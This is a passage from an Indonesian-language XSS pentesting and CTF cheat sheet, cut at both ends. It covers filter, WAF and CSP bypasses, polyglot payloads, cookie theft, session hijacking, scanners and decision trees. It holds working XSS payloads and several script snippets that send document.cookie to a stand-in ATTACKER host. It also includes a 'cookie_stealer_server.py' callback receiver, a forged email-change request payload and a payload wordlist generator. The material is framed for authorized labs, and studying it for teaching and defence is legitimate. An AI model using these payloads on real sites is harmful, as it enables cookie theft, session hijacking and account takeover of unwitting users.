```javascript
alert`1`
```

---

## Unicode Escape

Dalam JavaScript identifier context tertentu:

```javascript
\u0061lert(1)
```

`0061` = `a`.

---

## String Concatenation

```javascript
window['al'+'ert'](1)
```

---

## `eval` Combination

```javascript
eval('ale'+'rt(1)')
```

> Keberhasilan sangat bergantung pada parser, sanitizer, CSP, dan apakah `eval` diizinkan.

---

# 6.4 Quote Filter Bypass

## 📌 Kapan Digunakan

Saat single quote atau double quote diblok.

Single quote:

```text
'
```

Alternative:

```text
"
```

Template literal:

```text
`
```

Tanpa quote:

```javascript
alert`1`
```

---

## String.fromCharCode

Contoh:

```javascript
String.fromCharCode(97,108,101,114,116)
```

menghasilkan:

```text
alert
```

Pemanggilan function dapat membutuhkan context tambahan.

---

# 6.5 Space Filter Bypass

## 📌 Kapan Digunakan

Saat whitespace diblok.

Alternatif:

```text
TAB
NEWLINE
COMMENTS
```

Example HTML:

```html
<img/**/src=x/**/onerror=alert(1)>
```

Contoh event:

```html
<svg
onload=alert(1)>
```

---

# 6.6 Bracket Filter Bypass

## 📌 Kapan Digunakan

Saat `(` dan `)` difilter.

PoC:

```javascript
alert`1`
```

Alternative JavaScript invocation dapat menggunakan method tertentu, tetapi validitasnya bergantung pada grammar/context.

Contoh:

```javascript
window.alert.call(null,1)
```

---

# 6.7 WAF Bypass Approach

## 📌 Kapan Digunakan

Saat browser/application menunjukkan:

```text
payload → blocked
mutated payload → accepted
```

Jangan melakukan blind mutation.

Gunakan workflow:

```text
Baseline Payload
       │
       ▼
Which character is blocked?
       │
       ├── <
       ├── >
       ├── /
       ├── quote
       ├── keyword
       └── event
       │
       ▼
Mutate ONE component
       │
       ▼
Retest
       │
       ▼
Observe normalization
```

---

# 6.8 Polyglot XSS

## 📌 Kapan Digunakan
Saat konteks injeksi belum diketahui secara pasti, atau ketika ingin menguji satu payload universal yang dirancang untuk dapat mengeksekusi kode di berbagai konteks sekaligus (HTML body, atribut tag, dan string JavaScript).

### 1. Contoh Polyglot Basic
Bekerja pada HTML body, atribut ganda/tunggal, dan comment block:
```javascript
'"><img src=x onerror=alert(1)>
```

### 2. Contoh Polyglot Kompleks (Multi-Context)
Bekerja saat payload terefleksi di dalam script tag, style tag, textarea, title, tag attribute, maupun HTML body:
```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=alert(1)//
```

### 3. Kapan Polyglot TIDAK Disarankan
- **Konteks Sudah Teridentifikasi:** Jika Anda sudah tahu input masuk ke `<input value="...">`, payload spesifik `" onfocus="alert(1)` jauh lebih efektif dan bersih.
- **WAF / IDS Evasion:** Payload polyglot umumnya sangat panjang dan memuat banyak signature karakter berbahaya, sehingga sangat mudah memicu rule WAF (ModSecurity, Cloudflare).
- **Pembelajaran / CTF Muscle Memory:** Prioritaskan menganalisis konteks reflection terlebih dahulu daripada menyemprotkan polyglot secara membabi buta.

### 4. Quick Test Polyglot via curl
```bash
curl -s \
  --get \
  --data-urlencode 'q='"'"'"><img src=x onerror=alert(1)>' \
  http://TARGET/search | \
  grep -E '(onerror|<img|<script)'
```

---

# 🍪 7. XSS to Cookie Theft

# 7.1 Setup Cookie Receiver — Python

## 📌 Kapan Digunakan

Saat lab meminta pembuktian bahwa JavaScript dapat melakukan callback dengan data tertentu.

Buat:

```bash
nano cookie_receiver.py
```

Isi:

```python
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys


class CookieHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now(timezone.utc).isoformat()
        client_ip = self.client_address[0]

        cookie_values = params.get("c", [])

        print("\n=== XSS CALLBACK ===")
        print(f"Timestamp : {timestamp}")
        print(f"Client IP : {client_ip}")
        print(f"Path      : {parsed.path}")

        if cookie_values:
            print(f"Cookie    : {cookie_values[0]}")
        else:
            print("Cookie    : <not provided>")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def log_message(self, format, *args):
        return


def valid_port(value: str) -> int:
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("Port must be an integer")

    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(
            "Port must be between 1 and 65535"
        )

    return port


def main():
    parser = argparse.ArgumentParser(
        description="Simple XSS callback receiver for authorized labs."
    )

    parser.add_argument(
        "-p",
        "--port",
        type=valid_port,
        default=8000
    )

    parser.add_argument(
        "--bind",
        default="0.0.0.0"
    )

    args = parser.parse_args()

    try:
        ipaddress.ip_address(args.bind)
    except ValueError:
        if args.bind not in ("localhost", "0.0.0.0"):
            print("[!] Invalid bind address", file=sys.stderr)
            sys.exit(1)

    server = HTTPServer(
        (args.bind, args.port),
        CookieHandler
    )

    print(
        f"[*] Listening on "
        f"http://{args.bind}:{args.port}"
    )

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping server...")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
```

Jalankan:

```bash
chmod +x cookie_receiver.py
python3 cookie_receiver.py --port 8000
```

Expected:

```text
[*] Listening on http://0.0.0.0:8000
```

---

# 7.2 XSS Payload Cookie Theft

## 📌 Kapan Digunakan

Dalam lab saat cookie target memang merupakan object yang sengaja dijadikan bagian challenge.

### `document.cookie`

```html
<script>
fetch('http://ATTACKER:8000/?c='+
encodeURIComponent(document.cookie))
</script>
```

---

## Fetch

Versi multiline:

```html
<script>
const c = encodeURIComponent(document.cookie);
fetch('http://ATTACKER:8000/?c=' + c);
</script>
```

---

## Image Trick

```html
<script>
new Image().src =
'http://ATTACKER:8000/?c='+
encodeURIComponent(document.cookie);
</script>
```

---

## XMLHttpRequest

```html
<script>
const x = new XMLHttpRequest();
x.open(
    'GET',
    'http://ATTACKER:8000/?c='+
    encodeURIComponent(document.cookie)
);
x.send();
</script>
```

---

## Expected Receiver

```text
=== XSS CALLBACK ===
Timestamp : 2026-...
Client IP : 10.10.10.20
Path      : /
Cookie    : session=abc123
```

---

# 7.3 Apa yang Dilakukan dengan Cookie

Pada **CTF/lab**, jika challenge memang meminta penggunaan session cookie:

### Browser

```text
DevTools
  ↓
Application
  ↓
Cookies
  ↓
Edit target cookie
  ↓
Reload
```

### curl

```bash
curl -i \
-H 'Cookie: session=VALUE' \
http://TARGET/profile
```

---

## Validation

Jangan menganggap:

```text
cookie captured
=
session valid
```

Test:

```text
Captured Cookie
      │
      ▼
Send request
      │
      ▼
Authenticated?
      │
 ┌────┴────┐
YES        NO
 │          │
 ▼          ▼
Session     Expired / wrong
valid       / bound / HttpOnly irrelevant
```

---

# 🎫 8. XSS to Session Hijacking

# 8.1 Dari Cookie ke Session

## 📌 Kapan Digunakan

Hanya dalam lab ketika session cookie memang digunakan sebagai authentication state.

Capture:

```text
session=ABC123
```

Test:

```bash
curl -i \
-H 'Cookie: session=ABC123' \
http://TARGET/account
```

Expected:

```text
200 OK
```

dan:

```text
Account page
```

---

## Browser Session Test

```text
DevTools
  ↓
Application
  ↓
Cookies
  ↓
Replace cookie
  ↓
Reload page
```

---

# 8.2 HttpOnly Cookie — Batas dan Alternatif

## 📌 Kapan Digunakan

Saat:

```text
document.cookie
```

tidak memperlihatkan session cookie tertentu.

Contoh:

```http
Set-Cookie: session=ABC123; HttpOnly
```

Maka:

```javascript
document.cookie
```

tidak dapat membaca cookie tersebut.

---

## Penting

`HttpOnly` **bukan anti-XSS**.

XSS masih dapat melakukan authenticated request:

```text
XSS
 │
 ▼
fetch('/api/profile')
 │
 ▼
Browser automatically includes eligible cookies
 │
 ▼
Authenticated response
```

Jadi XSS dapat melakukan tindakan sebagai victim tanpa mengetahui nilai cookie secara langsung.

---

## XSS Request Forgery

Contoh lab:

```html
<script>
fetch('/account/change-email', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'email=attacker@example.test'
});
</script>
```

Ini bekerja jika:

```text
same-origin request
+
browser sends credentials
+
application has no additional anti-CSRF control
```

---

# 🛡️ 9. CSP Bypass

# 9.1 Apa Itu CSP

**Content Security Policy** adalah browser security policy yang membatasi resource/script yang boleh dieksekusi.

Contoh:

```http
Content-Security-Policy:
default-src 'self';
script-src 'self'
```

---

## Directive Penting

|Directive|Fungsi|
|---|---|
|`default-src`|default policy|
|`script-src`|sumber JavaScript|
|`style-src`|sumber CSS|
|`img-src`|sumber image|
|`connect-src`|fetch/XHR/WebSocket|
|`object-src`|plugin/object resources|
|`frame-src`|iframe sources|
|`base-uri`|`<base>` behavior|

---

# 9.2 Cara Detect CSP

## 📌 Kapan Digunakan

Saat XSS PoC:

```text
reflection ✅
context ✅
execution ❌
```

dan browser console menunjukkan CSP violation.

---

## curl

```bash
curl -s -D - \
-o /dev/null \
http://TARGET/ |
grep -i \
-E 'content-security-policy|content-security-policy-report-only'
```

Expected:

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## Browser DevTools

```text
F12
→ Network
→ document request
→ Headers
→ Response Headers
→ Content-Security-Policy
```

Console:

```text
Refused to execute inline script...
```

adalah clue penting.

---

# 9.3 Common CSP Misconfigurations

## Wildcard

```text
script-src *
```

Terlalu luas.

---

## `unsafe-inline`

```text
script-src 'self' 'unsafe-inline'
```

Inline script dapat diizinkan.

---

## `unsafe-eval`

```text
script-src 'self' 'unsafe-eval'
```

> ⚠️ **Catatan Kritis `unsafe-eval`:**
> Direktif `'unsafe-eval'` tidak hanya mengizinkan pemanggilan fungsi `eval()`, tetapi juga membuka seluruh primitif evaluasi string JavaScript yang setara, meliputi:
> - `eval(string)`
> - `Function(string)()`
> - `setTimeout("string", delay)`
> - `setInterval("string", delay)`
> - `window.execScript(string)` (legacy)
>
> Jika CSP mengaktifkan `'unsafe-eval'`, injeksi kode JavaScript yang diblokir dari inline `<script>` dapat dieksekusi secara dinamis melalui vektor evaluasi string di atas jika terdapat script terpercaya yang meneruskan user input ke dalam fungsi-fungsi tersebut.

---

## Trusted Domain + Open Redirect

Misalnya:

```text
script-src 'self' https://cdn.example
```

tetapi:

```text
https://cdn.example/redirect?url=...
```

memiliki open redirect yang dapat dipakai dalam beberapa CSP bypass scenarios, tergantung browser/parser/resource type.

---

## JSONP Endpoint

Legacy JSONP:

```text
https://cdn.example/api?callback=alert
```

Jika trusted domain mengizinkan script loading dan endpoint dapat dipengaruhi, endpoint tersebut perlu dianalisis.

---

# 9.4 CSP Bypass Techniques

## `unsafe-inline`

Jika:

```text
script-src 'unsafe-inline'
```

inline script dapat menjadi candidate:

```html
<script>alert(1)</script>
```

---

## Nonce-Based CSP

Contoh:

```http
script-src 'nonce-ABC123'
```

Inline script harus menggunakan nonce:

```html
<script nonce="ABC123">
...
</script>
```

Mencari nonce harus dilakukan pada lab yang memang mengajarkan leakage/misconfiguration.

---

## Trusted Domain + Open Redirect

Flow:

```text
CSP trusts cdn.example
       │
       ▼
cdn.example/redirect
       │
       ▼
redirect controlled by attacker
       │
       ▼
Browser loads resource
```

Keberhasilan bergantung pada resource loading semantics dan CSP parser.

---

## JSONP

Concept:

```text
Trusted Script Origin
       │
       ▼
JSONP Endpoint
       │
       ▼
Attacker-controlled callback
       │
       ▼
JavaScript execution
```

Kehadiran JSONP tidak otomatis berarti CSP bypass.

---

# 🧰 10. Tools & Automation

# 10.1 Browser DevTools untuk XSS

## 📌 Kapan Digunakan

Selalu gunakan sebagai primary manual tool.

### Console

Test:

```javascript
alert(1)
```

Inspect:

```javascript
document.domain
location.href
document.cookie
```

---

### Elements

Cari:

```text
<img>
<script>
<input>
href=
src=
style=
```

Periksa apakah input:

```text
escaped
unescaped
attribute-encoded
```

---

### Network

Lihat:

```text
Request
Query string
POST body
Response
Redirect
CSP
Cookies
```

---

### Sources

Search:

```text
innerHTML
eval(
document.write
location.hash
location.search
document.URL
```

---

# 10.2 Burp Suite untuk XSS

## 📌 Kapan Digunakan

Saat request:

```text
POST
JSON
Cookie
Headers
complex parameters
```

perlu dimodifikasi berulang kali.

---

## Repeater

Workflow:

```text
Browser
  ↓
Burp Proxy
  ↓
Intercept
  ↓
Send to Repeater
  ↓
Modify one parameter
  ↓
Send
  ↓
Compare response
```

---

## Intruder

Cocok untuk:

```text
payload mutation
context testing
filter detection
```

Gunakan dengan rate rendah pada lab.

---

# 10.3 Dalfox — XSS Scanner

## 📌 Kapan Digunakan

Setelah recon dan parameter discovery, untuk mempercepat candidate discovery.

Install:

```bash
sudo apt install golang -y
go install github.com/hahwul/dalfox/v2@latest
```

Tambahkan path:

```bash
export PATH="$PATH:$(go env GOPATH)/bin"
```

Verifikasi:

```bash
dalfox version
```

Basic:

```bash
dalfox url 'http://TARGET/search?q=test'
```

Output dapat berisi:

```text
[POC] Parameter 'q' appears vulnerable
```

---

## URL List

```bash
dalfox file urls.txt
```

> Scanner result harus divalidasi manual. Reflection, HTML injection, dan executable XSS tidak selalu sama.

---

# 10.4 XSStrike

## 📌 Kapan Digunakan

Untuk automated XSS discovery dan context analysis.

Clone & Setup Virtual Environment:

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike

# Gunakan virtual environment untuk menghindari konflik paket sistem di Parrot OS:
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Jalankan scan:

```bash
python3 xsstrike.py \
-u 'http://TARGET/search?q=test'
```

Help:

```bash
python3 xsstrike.py --help
```

---

# 10.5 Manual Testing dengan curl

## Reflection

```bash
curl -s \
--get \
--data-urlencode 'q=XSS_TEST_123' \
http://TARGET/search |
grep -n 'XSS_TEST_123'
```

---

## Basic PoC

```bash
curl -s \
--get \
--data-urlencode \
'q=<script>alert(1)</script>' \
http://TARGET/search
```

---

## Header Reflection

```bash
curl -s \
http://TARGET/ \
-H 'User-Agent: XSS_TEST_123' |
grep -n 'XSS_TEST_123'
```

---

## Cookie Reflection

```bash
curl -s \
http://TARGET/ \
-H 'Cookie: test=XSS_TEST_123' |
grep -n 'XSS_TEST_123'
```

---

# ⚙️ 11. Automation Scripts

# 11.1 Script `xss_detect.sh`

## 📌 Kapan Digunakan

Untuk screening cepat apakah suatu GET parameter:

```text
direfleksikan
mengubah response
mengandung HTML reflection
```

Script tidak mengklaim vulnerability hanya berdasarkan reflection.

```bash
#!/usr/bin/env bash

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <url> <parameter>"
    echo "Example:"
    echo "$0 'http://TARGET/search' q"
    exit 1
}

[[ $# -eq 2 ]] || usage

URL="$1"
PARAM="$2"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
    exit 1
fi

if [[ "$URL" =~ [[:space:]] ]]; then
    echo -e "${RED}[!] URL contains whitespace${NC}"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo -e "${RED}[!] Invalid parameter name${NC}"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!] curl is required${NC}"
    exit 1
fi

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

MARKER="XSS_TEST_$RANDOM"

echo -e "${BLUE}[*] URL       : $URL${NC}"
echo -e "${BLUE}[*] Parameter : $PARAM${NC}"
echo -e "${BLUE}[*] Marker    : $MARKER${NC}"

echo
echo -e "${YELLOW}=== Baseline ===${NC}"

BASE_TIME="$(
    curl -ksS \
    -o "$TMP/base" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=normal123" \
    "$URL"
)"

BASE_SIZE="$(wc -c < "$TMP/base")"

echo "Time : ${BASE_TIME}s"
echo "Size : ${BASE_SIZE}"

echo
echo -e "${YELLOW}=== Reflection Test ===${NC}"

REF_TIME="$(
    curl -ksS \
    -o "$TMP/reflection" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=$MARKER" \
    "$URL"
)"

REF_SIZE="$(wc -c < "$TMP/reflection")"

echo "Time : ${REF_TIME}s"
echo "Size : ${REF_SIZE}"

if grep -Fq "$MARKER" "$TMP/reflection"; then
    echo -e "${GREEN}[+] Marker reflected in response${NC}"
else
    echo "[-] Marker not reflected"
    exit 0
fi

echo
echo -e "${YELLOW}=== Context Clues ===${NC}"

grep -n -F "$MARKER" "$TMP/reflection" | head -10

echo
echo -e "${YELLOW}=== HTML-like PoC Reflection ===${NC}"

POC="<img src=x onerror=alert(1)>"

curl -ksS \
--get \
--data-urlencode "${PARAM}=$POC" \
"$URL" \
-o "$TMP/poc"

if grep -Eq \
'(<img|onerror=|<svg|<script)' \
"$TMP/poc"; then

    echo -e "${GREEN}[+] HTML/XSS payload appears in response${NC}"
    echo "[!] Validate exact browser execution context manually."
else
    echo "[-] Basic HTML payload not obviously reflected"
fi

echo
echo -e "${YELLOW}=== Conclusion ===${NC}"

echo "Reflection     : inspect manually"
echo "HTML appearance: inspect manually"
echo "Execution      : MUST be confirmed in browser"
echo
echo "Next steps:"
echo "1. Inspect exact reflection context"
echo "2. Determine HTML / attribute / JS / URL context"
echo "3. Select context-specific payload"
echo "4. Check CSP and sanitization"
echo "5. Confirm actual execution"
```

Jalankan:

```bash
chmod +x xss_detect.sh
./xss_detect.sh 'http://TARGET/search' q
```

---

# 11.2 Script `cookie_stealer_server.py`

## 📌 Kapan Digunakan

Untuk menerima callback dari payload XSS di lab.

Script sudah melakukan:

```text
port validation
bind validation
URL parsing
query parsing
timestamp logging
IP logging
```

```python
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys


class CallbackHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now(timezone.utc).isoformat()
        ip = self.client_address[0]

        print("\n" + "=" * 55)
        print("XSS CALLBACK")
        print("=" * 55)
        print(f"Timestamp : {timestamp}")
        print(f"IP        : {ip}")
        print(f"Path      : {parsed.path}")

        if "c" in params:
            print(f"Cookie    : {params['c'][0]}")
        else:
            print("Cookie    : <none>")

        if "event" in params:
            print(f"Event     : {params['event'][0]}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def log_message(self, fmt, *args):
        return


def parse_port(value):
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(
            "Port must be numeric"
        )

    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(
            "Port must be 1-65535"
        )

    return port


def validate_bind(value):
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        if value == "localhost":
            return value

        raise argparse.ArgumentTypeError(
            "Bind must be a valid IP or localhost"
        )


def main():
    parser = argparse.ArgumentParser(
        description="XSS callback receiver for authorized labs"
    )

    parser.add_argument(
        "-p",
        "--port",
        type=parse_port,
        default=8000
    )

    parser.add_argument(
        "--bind",
        type=validate_bind,
        default="0.0.0.0"
    )

    args = parser.parse_args()

    try:
        server = HTTPServer(
            (args.bind, args.port),
            CallbackHandler
        )
    except OSError as exc:
        print(
            f"[!] Failed to bind server: {exc}",
            file=sys.stderr
        )
        sys.exit(1)

    print(
        f"[*] XSS receiver listening on "
        f"{args.bind}:{args.port}"
    )

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
```

Jalankan:

```bash
python3 cookie_stealer_server.py --port 8000
```

Test manual:

```bash
curl \
'http://127.0.0.1:8000/?c=test_cookie&event=lab'
```

Expected:

```text
=======================================================
XSS CALLBACK
=======================================================
Timestamp : 2026-...
IP        : 127.0.0.1
Path      : /
Cookie    : test_cookie
Event     : lab
```

---

# 11.3 XSS Payload Wordlist Generator

## 📌 Kapan Digunakan

Saat ingin memiliki payload baseline berdasarkan context.

```bash
#!/usr/bin/env bash

set -euo pipefail

OUTPUT="${1:-xss_payloads.txt}"

if [[ "$OUTPUT" = /* ]]; then
    :
elif [[ "$OUTPUT" =~ ^[A-Za-z0-9._-]+$ ]]; then
    :
else
    echo "[!] Invalid output filename"
    echo "Use a simple filename such as xss_payloads.txt"
    exit 1
fi

cat > "$OUTPUT" <<'EOF'
# HTML
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>

# Attribute
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
' onmouseover='alert(1)

# JavaScript single quote
';alert(1);//

# JavaScript double quote
";alert(1);//

# Template literal
${alert(1)}
`;alert(1);//

# URL
javascript:alert(1)

# Keyword variation
confirm(1)
prompt(1)
alert`1`
window['alert'](1)
eval('ale'+'rt(1)')
EOF

echo "[+] Payload wordlist created: $OUTPUT"
wc -l "$OUTPUT"
```

Jalankan:

```bash
chmod +x xss_payload_generator.sh
./xss_payload_generator.sh
```

Output:

```text
[+] Payload wordlist created: xss_payloads.txt
35 xss_payloads.txt
```

---

# 🌳 12. Decision Tree

## Standalone XSS Decision Tree

```text
INPUT DITEMUKAN DI HALAMAN
             │
             ▼
     Apakah input kembali?
             │
       ┌─────┴─────┐
      YES          NO
       │             │
       ▼             ▼
   REFLECTED      Check Stored
       │             │
       ▼             ▼
  Inspect Context  Stored?
       │             │
       ├─────────────┤
       │             │
       ▼             ▼
 HTML Body       YES → STORED XSS
       │
       └── <script>alert(1)</script>
       
 Attribute
       │
       └── " onmouseover="alert(1)

 JS String
       │
       └── ';alert(1);//
       
 Template Literal
       │
       └── ${alert(1)}

 URL
       │
       └── javascript:alert(1)
       
             │
             ▼
         JS EXECUTE?
             │
       ┌─────┴─────┐
      YES           NO
       │             │
       ▼             ▼
   XSS CONFIRMED   Check:
                     │
                     ├── Encoding
                     ├── Sanitizer
                     ├── CSP
                     ├── WAF
                     └── Wrong Context
                     
             │
             ▼
        DOM ANALYSIS
             │
      ┌──────┴──────┐
      │             │
   Source          Sink
      │             │
      ▼             ▼
location.hash   innerHTML
location.search eval
document.URL     write
      │             │
      └──────┬──────┘
             ▼
         DOM XSS?
             │
            YES
             │
             ▼
       Impact Analysis
             │
       ┌─────┼─────┐
       ▼     ▼     ▼
   Cookie  Auth   UI/
   Access Requests Phishing
```

---

## Context Decision Tree

```text
XSS REFLECTION
      │
      ▼
Where is INPUT?
      │
 ┌────┼─────┬────────┬────────┐
 ▼    ▼     ▼        ▼        ▼
HTML Attr   JS      URL      DOM
 │    │      │        │        │
 │    │      │        │        │
 ▼    ▼      ▼        ▼        ▼
Tag  Break  Break    Scheme   Trace
     quote  quote              source
 │    │      │        │        │
 ▼    ▼      ▼        ▼        ▼
PoC  event  JS code  URL PoC   sink
```

---

## Reflected XSS Path

```text
Input
 │
 ▼
URL Parameter
 │
 ▼
Response
 │
 ▼
Reflection
 │
 ▼
Context?
 │
 ├── HTML → tag payload
 ├── Attribute → quote break
 ├── JS string → string break
 ├── URL → scheme analysis
 └── DOM → source/sink tracing
 │
 ▼
PoC Execution
 │
 ▼
Impact
```

---

## Stored XSS Path

```text
Input
 │
 ▼
Comment/Profile/Ticket
 │
 ▼
Stored
 │
 ▼
Open page
 │
 ▼
Payload rendered
 │
 ▼
Context
 │
 ▼
JavaScript
 │
 ▼
Victim/Admin
 │
 ▼
Impact
```

---

## DOM XSS Path

```text
URL / DOM Source
       │
       ▼
JavaScript Processing
       │
       ▼
Dangerous Sink?
       │
  ┌────┴────┐
 YES        NO
  │          │
  ▼          ▼
Test PoC   Safe sink?
  │
  ▼
Execution?
  │
  ▼
DOM XSS
```

---

# 🛠️ 13. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Payload tidak jalan tetapi muncul di source|Input di-escape|Tentukan encoding context|
|`alert()` tidak muncul|Payload tidak executable|Periksa exact HTML/JS context|
|Reflection ditemukan tetapi bukan XSS|Reflection saja bukan execution|Trace parser/context dan sanitizer|
|`<script>` tidak jalan|Tag difilter atau context salah|Gunakan context-based event handler hanya setelah memahami sink|
|Attribute payload gagal|Quote tidak dapat di-break|Cocokkan `'` vs `"` dan inspect DOM|
|JS payload gagal|Input bukan berada dalam JS string|Inspect source/response|
|`${alert(1)}` gagal|Bukan template literal|Pastikan context menggunakan backtick|
|Cookie undefined/empty|Cookie tidak accessible dari JS|Cek `HttpOnly`, domain/path, dan current origin|
|HttpOnly cookie tidak bisa dicuri|Memang desain HttpOnly|Analisis authenticated requests sebagai alternatif impact|
|CSP blocking|`script-src` melarang inline script|Inspect CSP dan cari execution path yang memang diizinkan|
|WAF blocking|Payload signature terdeteksi|Identify exact blocked component lalu mutate secara sistematis|
|Encoding merusak payload|Browser/server decode berbeda|Trace raw request → response → DOM|
|Double encoding gagal|App hanya decode sekali|Gunakan hanya jika ada evidence multiple decoding|
|Alert muncul di console tetapi tidak di page|Browser context berbeda|Gunakan console/DOM inspection|
|Stored payload hilang setelah submit|Sanitization/validation|Bandingkan stored value dan rendered value|
|Blind XSS tidak callback|Victim tidak membuka payload|Pastikan challenge memang memicu admin/user view|
|Blind XSS callback tetapi cookie kosong|HttpOnly atau no auth cookie|Gunakan non-sensitive callback proof|
|DOM XSS ada source tetapi tidak ada sink|Data tidak mencapai dangerous sink|Trace data flow lebih jauh|
|`innerHTML` ada tetapi aman|Input di-escaped sebelum sink|Cari transformation/encoding sebelum assignment|
|`eval()` tidak execute|CSP `unsafe-eval` restriction|Inspect browser console/CSP|
|`javascript:` URL tidak bekerja|Browser/sanitizer blocks scheme|Inspect exact attribute and sanitization|
|Dalfox false positive|Reflection dianggap XSS|Reproduce manually di browser|
|XSStrike tidak menemukan|Parameter/context kompleks|Save request dan test manual/Burp|
|Cookie receiver tidak mendapat request|Callback address tidak reachable|Verifikasi routing/firewall/listener|
|Port 8000 already in use|Process lain menggunakan port|Gunakan port lain, misalnya `8001`|
|Receiver menerima callback tetapi data tidak ada|Payload hanya mengirim event|Tambahkan parameter lab yang ingin diuji|
|Session cookie captured tetapi tidak valid|Expired/bound/session rotated|Test exact session lifetime and binding|
|XSS works tetapi CSP report muncul|CSP mungkin `Report-Only`|Bedakan enforcement dengan monitoring|
|CSS injection ditemukan tetapi tidak ada JS|CSS bukan otomatis XSS|Catat sebagai CSS injection kecuali ada executable path|
|JSON reflection ditemukan tetapi tidak execute|JSON bukan HTML sink|Trace apakah data akhirnya masuk `innerHTML`/script context|

---

# 🧠 XSS Mindset

Jangan berpikir:

```text
"Payload apa yang paling sakti?"
```

Gunakan:

```text
INPUT
 │
 ▼
DIMANA MASUK?
 │
 ├── HTML?
 ├── Attribute?
 ├── JS?
 ├── URL?
 ├── CSS?
 └── DOM?
      │
      ▼
BAGAIMANA BROWSER PARSE?
      │
      ▼
BISA BREAK CONTEXT?
      │
      ▼
BISA EXECUTE?
      │
      ▼
APA IMPACT-NYA?
```

---

# 🔬 Reflection vs Execution

Ini adalah konsep paling penting dalam XSS testing:

```text
Input reflected
       │
       ▼
Reflection confirmed
       │
       ▼
     STOP?
       │
      NO
       │
       ▼
Find context
       │
       ▼
Find parser
       │
       ▼
Break context
       │
       ▼
JavaScript executes?
       │
  ┌────┴────┐
 NO        YES
  │          │
  ▼          ▼
Not XSS    XSS
```

Jangan menulis finding:

```text
"XSS karena input reflected"
```

Reflection bukan bukti execution.

---

# ✅ Final XSS Checklist

```text
[ ] Parameter/input ditemukan
[ ] Reflection diuji
[ ] Stored behavior diuji
[ ] DOM source diperiksa
[ ] Exact sink ditemukan
[ ] Execution context diidentifikasi
[ ] HTML context diuji
[ ] Attribute context diuji
[ ] JavaScript context diuji
[ ] Template literal context diuji
[ ] URL context diuji
[ ] CSP diperiksa
[ ] WAF/filter behavior diperiksa
[ ] Sanitization/encoding diperiksa
[ ] PoC execution berhasil
[ ] Reflected / Stored / DOM classification benar
[ ] Impact dinilai
[ ] HttpOnly/SameSite/Secure cookie dianalisis
[ ] Authenticated actions diuji pada lab
[ ] Callback server tersedia bila dibutuhkan
[ ] Finding divalidasi secara manual
[ ] Evidence disimpan
```

---

# 🎯 Quick CTF Recipe

Ketemu parameter:

```text
http://TARGET/search?q=test
```

### 1. Reflection

```bash
curl -s \
--get \
--data-urlencode 'q=XSS_TEST_123' \
http://TARGET/search |
grep -n 'XSS_TEST_123'
```

### 2. Basic PoC

```bash
curl -s \
--get \
--data-urlencode \
'q=<script>alert(1)</script>' \
http://TARGET/search
```

### 3. Bila `<script>` diblok

```bash
curl -s \
--get \
--data-urlencode \
'q=<img src=x onerror=alert(1)>' \
http://TARGET/search
```

### 4. Inspect Context

```text
HTML?
Attribute?
JavaScript?
URL?
DOM?
```

### 5. DOM Search

```text
F12
→ Sources
→ Ctrl+Shift+F
→ innerHTML
→ location.hash
→ location.search
→ document.write
→ eval
```

### 6. Callback

Receiver:

```bash
python3 -m http.server 8000
```

Payload:

```html
<script>
fetch('http://ATTACKER:8000/?xss=1')
</script>
```

### 7. Impact

```text
PoC
 │
 ▼
Execution
 │
 ▼
Context
 │
 ▼
Victim privilege
 │
 ▼
Accessible data/actions
```

---

# [🔥 20 — XSS Workflow](/docs/xss) — XSS Complete Attack Workflow: Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
